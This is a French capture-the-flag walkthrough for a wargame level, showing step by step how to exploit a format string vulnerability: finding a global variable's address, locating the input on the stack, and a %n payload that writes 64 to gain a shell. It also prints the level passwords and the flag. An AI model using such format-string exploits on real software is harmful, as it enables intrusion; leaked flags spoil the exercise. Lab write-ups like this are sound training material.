# Level3 - Walkthrough

## Objectif
Utiliser une format string vulnerability pour écrire la valeur 64 dans la variable globale `m`.

---

## Étape 1 : Connexion

```bash
ssh level3@localhost -p 4242
# Mot de passe : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

---

## Étape 2 : Reconnaissance

```bash
ls -la
./level3
test
# test
```

Le programme affiche simplement notre input.

---

## Étape 3 : Identifier la vulnérabilité

Tester avec des format specifiers :
```bash
python -c "print('%x %x %x')" | ./level3
```

Si des valeurs hexadécimales s'affichent → Format string vulnerability confirmée.

---

## Étape 4 : Trouver l'adresse de m

Dans Ghidra, chercher la variable globale `m`.

Adresse : `0x0804988c`

La condition est : `if (m == 0x40)` → `m` doit être égal à 64 (0x40 en hexa).

---

## Étape 5 : Trouver la position sur la stack

```bash
python -c "print('AAAA' + '%x.'*10)" | ./level3
```

Résultat :
```
AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825...
```

`41414141` (AAAA) apparaît en **4ème position**.

---

## Étape 6 : Construction du payload

Structure :
- Adresse de `m` (4 octets) : `\x8c\x98\x04\x08`
- Padding pour afficher 60 caractères : `%60x`
- Format specifier pour écrire : `%4$n`

Total de caractères affichés : 4 + 60 = **64**

`%4$n` écrit la valeur 64 à l'adresse en 4ème position (notre adresse de `m`).

---

## Étape 7 : Exploitation

```bash
(python -c "print('\x8c\x98\x04\x08' + '%60x' + '%4\$n')"; cat) | ./level3
```

Le programme affiche "Wait what?!" et ouvre un shell.

```bash
cat /home/user/level4/.pass
```

---

## Étape 8 : Passer au niveau suivant

```bash
exit
su level4
# Mot de passe : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

## Flag
```
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
